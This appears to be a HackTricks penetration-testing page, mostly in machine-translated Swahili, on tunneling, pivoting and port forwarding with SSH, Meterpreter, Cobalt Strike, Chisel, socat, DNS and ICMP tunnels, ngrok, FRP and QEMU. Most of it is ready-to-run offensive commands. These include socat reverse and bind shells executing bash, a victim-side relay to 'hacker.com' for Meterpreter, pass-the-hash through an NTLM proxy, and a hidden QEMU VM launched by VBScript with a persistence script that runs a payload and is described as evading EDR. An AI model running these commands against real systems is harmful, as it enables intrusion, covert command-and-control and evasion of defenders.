# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap tip

> [!WARNING]
> **ICMP** na **SYN** skani haziwezekani kupitishwa kupitia socks proxies, hivyo tunapaswa **kuondoa kugundua ping** (`-Pn`) na kubainisha **TCP skani** (`-sT`) ili hii ifanye kazi.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH muunganisho wa picha (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

Fungua Bandari Mpya kwenye SSH Server --> Bandari Nyingine
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Local port --> Compromised host (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Porti za ndani --> Kituo kilichovunjwa (SSH) --> Popote
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Hii ni muhimu kupata reverse shells kutoka kwa mwenyeji wa ndani kupitia DMZ hadi mwenyeji wako:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Unahitaji **root katika vifaa vyote viwili** (kama unavyotaka kuunda interfaces mpya) na usanidi wa sshd lazima uruhusu kuingia kama root:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
Washa upitishaji upande wa Server
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Weka njia mpya upande wa mteja
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Usalama – Shambulio la Terrapin (CVE-2023-48795)**
> Shambulio la kupunguza Terrapin la mwaka 2023 linaweza kumruhusu mtu katikati kuingilia kati mkutano wa awali wa SSH na kuingiza data katika **kitu chochote kilichosambazwa** ( `-L`, `-R`, `-D` ). Hakikisha mteja na seva zote zimepatishwa (**OpenSSH ≥ 9.6/LibreSSH 6.7**) au wazi wazi zima algorithimu hatarishi `chacha20-poly1305@openssh.com` na `*-etm@openssh.com` katika `sshd_config`/`ssh_config` kabla ya kutegemea SSH tunnels.

## SSHUTTLE

Unaweza **kufanya tunneling** kupitia **ssh** kwa ajili ya **trafiki** yote kwenda kwenye **subnetwork** kupitia mwenyeji.\
Kwa mfano, kusambaza trafiki yote inayokwenda 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Unganisha na ufunguo wa kibinafsi
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Porti za ndani --> Kituo kilichovunjwa (kipindi kinachofanya kazi) --> Sanduku_tatu:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Njia nyingine:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Fungua bandari katika teamserver inayosikiliza kwenye interfaces zote ambazo zinaweza kutumika **kuelekeza trafiki kupitia beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> Katika kesi hii, **bandari imefunguliwa katika mwenyeji wa beacon**, si katika Team Server na trafiki inatumwa kwa Team Server na kutoka hapo kwa mwenyeji:bandari iliyoonyeshwa.
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
To note:

- Reverse port forward ya Beacon imeundwa ili **kufanya tunnel trafiki kwa Team Server, sio kwa kuhamasisha kati ya mashine binafsi**.
- Trafiki **inafanywa tunnel ndani ya trafiki ya C2 ya Beacon**, ikiwa ni pamoja na viungo vya P2P.
- **Haki za Admin hazihitajiki** kuunda reverse port forwards kwenye bandari za juu.

### rPort2Port local

> [!WARNING]
> Katika kesi hii, **bandari imefunguliwa katika mwenyeji wa beacon**, sio katika Team Server na **trafiki inatumwa kwa mteja wa Cobalt Strike** (sio kwa Team Server) na kutoka hapo kwa mwenyeji:bandari iliyoonyeshwa.
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Unahitaji kupakia faili ya wavuti ya tunnel: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Unaweza kuipakua kutoka kwenye ukurasa wa toleo wa [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Unahitaji kutumia **toleo sawa kwa mteja na seva**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Kuelekeza bandari
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Tumia toleo sawa kwa wakala na proxy**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Ufunguo wa Wakala na Kusikiliza
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Fikia Bandari za Mitaa za Wakala
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Tundu la nyuma. Tundu linaanzishwa kutoka kwa mwathirika.\
Proxy ya socks4 inaundwa kwenye 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot kupitia **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port kupitia socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter kupitia SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Unaweza kupita **proxy isiyo na uthibitisho** ukitekeleza mstari huu badala ya wa mwisho kwenye konso ya mwathirika:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
### SSL Socat Tunnel

**/bin/sh console**

Unda vyeti pande zote mbili: Mteja na Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Unganisha bandari ya SSH ya ndani (22) na bandari ya 443 ya mwenyeji wa mshambuliaji
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Ni kama toleo la console la PuTTY (chaguzi ni sawa na mteja wa ssh).

Kwa kuwa hii binary itatekelezwa kwenye mwathirika na ni mteja wa ssh, tunahitaji kufungua huduma yetu ya ssh na bandari ili tuweze kuwa na muunganisho wa kurudi. Kisha, ili kuhamasisha bandari inayopatikana tu kwa ndani kwa bandari kwenye mashine yetu:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Unahitaji kuwa admin wa ndani (kwa bandari yoyote)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Unahitaji kuwa na **ufikiaji wa RDP juu ya mfumo**.\
Pakua:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Chombo hiki kinatumia `Dynamic Virtual Channels` (`DVC`) kutoka kwa kipengele cha Huduma ya Desktop ya K remote ya Windows. DVC inawajibika kwa **kuchora pakiti juu ya muunganisho wa RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Katika kompyuta yako ya mteja, pakia **`SocksOverRDP-Plugin.dll`** kama ifuatavyo:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Sasa tunaweza **kuunganisha** na **mhasiriwa** kupitia **RDP** kwa kutumia **`mstsc.exe`**, na tunapaswa kupokea **kiashiria** kinachosema kwamba **SocksOverRDP plugin imewezeshwa**, na itakuwa **inaskiliza** kwenye **127.0.0.1:1080**.

**Unganisha** kupitia **RDP** na pakia & tekeleza kwenye mashine ya mhasiriwa `SocksOverRDP-Server.exe` binary:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Sasa, thibitisha katika mashine yako (mshambuliaji) kwamba bandari 1080 inasikiliza:
```
netstat -antb | findstr 1080
```
Sasa unaweza kutumia [**Proxifier**](https://www.proxifier.com/) **kupanua trafiki kupitia bandari hiyo.**

## Proxify Windows GUI Apps

Unaweza kufanya programu za Windows GUI zipite kupitia proxy kwa kutumia [**Proxifier**](https://www.proxifier.com/).\
Katika **Profile -> Proxy Servers** ongeza IP na bandari ya seva ya SOCKS.\
Katika **Profile -> Proxification Rules** ongeza jina la programu ya kupanua na muunganisho kwa IP unazotaka kupanua.

## NTLM proxy bypass

Kifaa kilichotajwa hapo awali: **Rpivot**\
**OpenVPN** pia kinaweza kupita, kuweka chaguzi hizi katika faili la usanidi:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Inathibitisha dhidi ya proxy na inafunga bandari kwa ndani ambayo inapelekwa kwa huduma ya nje unayoelekeza. Kisha, unaweza kutumia chombo chochote unachokipenda kupitia bandari hii.\
Kwa mfano, hiyo inapeleka bandari 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Sasa, ikiwa utaweka kwa mfano katika mwathirika huduma ya **SSH** kusikiliza katika bandari 443. Unaweza kuungana nayo kupitia bandari ya mshambuliaji 2222.\
Pia unaweza kutumia **meterpreter** inayounganisha na localhost:443 na mshambuliaji anasikiliza katika bandari 2222.

## YARP

Kipindi cha kurudi kilichoundwa na Microsoft. Unaweza kukipata hapa: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Root inahitajika katika mifumo yote miwili ili kuunda tun adapters na kupitisha data kati yao kwa kutumia maswali ya DNS.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Tuneli itakuwa polepole sana. Unaweza kuunda muunganisho wa SSH ulioshinikizwa kupitia tuneli hii kwa kutumia:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Download it from here**](https://github.com/iagox86/dnscat2)**.**

Inaunda channel ya C\&C kupitia DNS. Haihitaji ruhusa za mzizi.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **Katika PowerShell**

Unaweza kutumia [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) kuendesha mteja wa dnscat2 katika powershell:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Kuelekeza bandari kwa kutumia dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Badilisha DNS ya proxychains

Proxychains inakamata `gethostbyname` libc call na inatunga ombi la tcp DNS kupitia socks proxy. Kwa **kawaida** seva ya **DNS** ambayo proxychains inatumia ni **4.2.2.2** (imeandikwa kwa nguvu). Ili kuibadilisha, hariri faili: _/usr/lib/proxychains3/proxyresolv_ na ubadilishe IP. Ikiwa uko katika **mazingira ya Windows** unaweza kuweka IP ya **meneja wa kikoa**.

## Tunnels katika Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Root inahitajika katika mifumo yote miwili ili kuunda tun adapters na kutunga data kati yao kwa kutumia ombi la ICMP echo.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Pakua kutoka hapa**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **ni chombo cha kufichua suluhisho kwa Mtandao kwa amri moja tu.**\
_Exposition URI ni kama:_ **UID.ngrok.io**

### Installation

- Tengeneza akaunti: https://ngrok.com/signup
- Pakua mteja:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Matumizi Msingi

**Hati:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Pia inawezekana kuongeza uthibitisho na TLS, ikiwa ni lazima._

#### Tunneling TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Kuweka wazi faili kwa HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP calls

_Inatumika kwa XSS, SSRF, SSTI ..._\
Moja kwa moja kutoka stdout au katika kiolesura cha HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling internal HTTP service
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml mfano wa usanidi rahisi

Inafungua mabwawa 3:

- 2 TCP
- 1 HTTP yenye uwasilishaji wa faili za kudumu kutoka /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Cloudflare’s `cloudflared` daemon inaweza kuunda tunnels za nje ambazo zinaonyesha **huduma za ndani za TCP/UDP** bila kuhitaji sheria za moto za kuingia, ikitumia edge ya Cloudflare kama mahali pa kukutana. Hii ni rahisi sana wakati firewall ya kutoka inaruhusu tu trafiki ya HTTPS lakini muunganisho wa kuingia umezuiwa.

### Quick tunnel one-liner
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### Tunnels za kudumu na DNS
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Anza kiunganishi:
```bash
cloudflared tunnel run mytunnel
```
Kwa sababu trafiki yote inatoka kwenye mwenyeji **nje kupitia 443**, Cloudflared tunnels ni njia rahisi ya kupita ACLs za kuingia au mipaka ya NAT. Kuwa makini kwamba binary kawaida inafanya kazi na mamlaka ya juu – tumia kontena au lippu `--user` inapowezekana.

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) ni reverse-proxy ya Go inayosimamiwa kwa ufanisi ambayo inasaidia **TCP, UDP, HTTP/S, SOCKS na P2P NAT-hole-punching**. Kuanzia na **v0.53.0 (Mei 2024)** inaweza kutenda kama **SSH Tunnel Gateway**, hivyo mwenyeji wa lengo anaweza kuanzisha tunnel ya kurudi kwa kutumia tu mteja wa kawaida wa OpenSSH – hakuna binary ya ziada inahitajika.

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Kutumia lango jipya la SSH (hakuna frpc binary)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Amri hapo juu inachapisha bandari ya mwathirika **8080** kama **attacker_ip:9000** bila kupeleka zana za ziada – bora kwa pivoting ya kuishi kwenye ardhi.

## Tunnels za Siri za VM kwa kutumia QEMU

Mitandao ya hali ya mtumiaji ya QEMU (`-netdev user`) inasaidia chaguo kinachoitwa `hostfwd` ambacho **kinafunga bandari ya TCP/UDP kwenye *host* na kupeleka ndani ya *guest***. Wakati mgeni anapokimbia daemon kamili ya SSH, sheria ya hostfwd inakupa sanduku la kuruka la SSH linaloweza kutumika ambalo linaishi kabisa ndani ya VM ya muda – bora kwa kuficha trafiki ya C2 kutoka EDR kwa sababu shughuli zote mbaya na faili zinabaki kwenye diski ya virtual.

### Mstari wa haraka
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• Amri hiyo inazindua picha ya **Tiny Core Linux** (`tc.qcow2`) katika RAM.  
• Bandari **2222/tcp** kwenye mwenyeji wa Windows inasambazwa kwa uwazi kwa **22/tcp** ndani ya mgeni.  
• Kutoka kwa mtazamo wa mshambuliaji, lengo linaonyesha tu bandari 2222; pakiti zozote zinazofikia hiyo zinashughulikiwa na seva ya SSH inayotembea katika VM.  

### Kuzindua kwa siri kupitia VBScript
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Kukimbia kwa script na `cscript.exe //B update.vbs` kunashikilia dirisha kuwa fiche.

### Uthibitisho ndani ya mgeni

Kwa sababu Tiny Core haina hali, washambuliaji kawaida:

1. Weka payload kwenye `/opt/123.out`
2. Ongeza kwenye `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Ongeza `home/tc` na `opt` kwenye `/opt/filetool.lst` ili payload ipakizwe kwenye `mydata.tgz` wakati wa kuzima.

### Kwa nini hii inakwepa kugunduliwa

• Ni executable mbili tu zisizo na saini (`qemu-system-*.exe`) zinagusa diski; hakuna madereva au huduma zinazowekwa.
• Bidhaa za usalama kwenye mwenyeji zinaona **trafiki ya loopback isiyo na madhara** (C2 halisi inamalizika ndani ya VM).
• Scanner za kumbukumbu kamwe hazichambui nafasi ya mchakato mbaya kwa sababu inaishi katika OS tofauti.

### Vidokezo vya Defender

• Onya kuhusu **binaries zisizotarajiwa za QEMU/VirtualBox/KVM** katika njia zinazoweza kuandikwa na mtumiaji.
• Zuia muunganisho wa nje unaotokana na `qemu-system*.exe`.
• Tafuta port za kusikiliza zisizo za kawaida (2222, 10022, …) zinazofunga mara moja baada ya uzinduzi wa QEMU.

---

## Zana nyingine za kuangalia

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## Marejeleo

- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)

{{#include ../banners/hacktricks-training.md}}
